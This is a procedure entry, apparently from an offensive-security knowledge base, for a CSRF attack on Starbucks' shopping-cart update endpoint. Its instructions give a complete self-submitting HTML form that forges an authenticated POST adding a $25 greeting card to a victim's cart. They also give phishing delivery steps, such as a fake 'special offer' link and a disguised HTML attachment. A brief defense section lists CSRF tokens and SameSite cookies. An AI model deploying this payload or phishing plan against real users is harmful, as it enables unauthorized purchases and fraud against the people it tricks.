---
id: proc-uuid-001
tags:
  - csrf
  - web-vulnerability
  - shopping-cart
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2024-10-04T00:00:00Z'
techniques:
  - '[[Drive-by Compromise]]'
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T17:27:35.868Z'
skill_level: intermediate
impact_level: high
detection_risk: low
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Drive-by Compromise]]'
  - '[[Exploit Public-Facing Application]]'
---
# CSRF-Add-Item-to-Starbucks-Shopping-Cart

## Summary

This procedure exploits a Cross-Site Request Forgery (CSRF) vulnerability in the Starbucks website's /shop/updatecart POST endpoint to add a $25 USD greeting card to an authenticated user's shopping cart without their knowledge or interaction, relying on the absence of CSRF tokens to process forged requests using the victim's session cookies.

## Description

The attack targets the updatecart endpoint at https://www.starbucks.com/shop/updatecart, which handles POST requests to modify the shopping cart. Due to missing anti-CSRF measures like tokens or SameSite cookies, an attacker can craft a malicious HTML form that auto-submits specific parameters (e.g., card_id=greeting_card, card_quantity=1, defined_amount=25, defined_currency=USD) when loaded in the victim's browser. If the victim is logged in, their session cookies authenticate the request, leading to unauthorized cart modification. This can result in unintended purchases, financial loss for the user, and reputational damage for Starbucks. The procedure assumes social engineering to deliver the payload while the victim is authenticated.

## Requirements

1. Basic knowledge of HTML and JavaScript for crafting the payload
2. A method to deliver the malicious HTML (e.g., hosting on a web server, email attachment, or phishing link)
3. Target victim must be authenticated on www.starbucks.com at the time of interaction
4. No direct access to victim's credentials or server-side changes needed

## Defense

Defensive measures and detection strategies:

- Implement CSRF tokens in all state-changing POST forms and validate them server-side
- Set session cookies with SameSite=Strict or SameSite=Lax attributes to prevent cross-site requests
- Monitor for anomalous cart additions from unexpected referers or user-agents
- Educate users on phishing and avoiding suspicious links while logged in

## Objectives

1. Forge an authenticated POST request to add an item to the victim's cart
2. Demonstrate the impact of missing CSRF protection on e-commerce endpoints
3. Highlight potential for chained attacks leading to financial fraud

## Instructions

### Step 1: Craft the Malicious HTML Form

**Context**: Create a self-submitting HTML page that targets the vulnerable endpoint with parameters to add a greeting card item.

**Code** (save as .html file):
```html
<!DOCTYPE html>
<html>
<head><title>Loading...</title></head>
<body>
  <form action="https://www.starbucks.com/shop/updatecart" method="POST" id="csrf-form">
    <input type="hidden" name="card_id" value="greeting_card">
    <input type="hidden" name="card_quantity" value="1">
    <input type="hidden" name="defined_amount" value="25">
    <input type="hidden" name="defined_currency" value="USD">
    <input type="hidden" name="greeting_card" value="true">
  </form>
  <script>
    document.getElementById('csrf-form').submit();
  </script>
</body>
</html>
```

> This code creates a hidden form and uses JavaScript to submit it immediately upon page load, forging the request with the victim's cookies if they are logged in to Starbucks.

### Step 2: Deliver the Payload to the Victim

**Context**: Distribute the HTML file or a link to it via social engineering to ensure the victim loads it while authenticated.

**Instructions**: Host the HTML on an attacker-controlled server (e.g., using a free hosting service) and send a phishing link like "Check this special offer from Starbucks" via email or messaging. Alternatively, attach the HTML file disguised as a promotion. Ensure the delivery tricks the victim into opening it on the same browser/session where they are logged into Starbucks.

> Expected behavior: Victim clicks the link, page loads, form submits silently, and the request is processed.

### Step 3: Verify the Attack Success

**Context**: Confirm the item was added to the victim's cart due to the successful forged request.

**Instructions**: Instruct the victim (or observe if possible) to navigate to their Starbucks shopping cart page (e.g., www.starbucks.com/cart). Check for the unauthorized $25 greeting card item. If the victim proceeds to checkout, it could lead to actual charges.

> Expected output: The cart contains the added greeting card without user initiation. Use browser dev tools to inspect network requests for confirmation during testing.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Drive-by Compromise]]
- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[csrf]]
- [[web]]
- [[ecommerce]]
